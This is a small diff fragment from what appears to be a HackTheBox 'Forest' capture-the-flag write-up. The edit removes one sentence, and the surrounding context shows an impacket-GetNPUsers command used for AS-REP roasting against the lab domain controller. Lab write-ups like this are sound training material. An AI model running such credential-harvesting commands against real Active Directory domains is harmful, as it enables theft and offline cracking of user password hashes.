@@ -72,8 +72,6 @@ To do that we can use `impacket-GetNPUsers` as such:
 impacket-GetNPUsers htb.local/ -dc-ip forest.htb -request -usersfile users.txt
 ```
 
-This resulted in the following:
-
 ![kerberoast-07](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Forest/img/kerberoast-07.png)
 
 
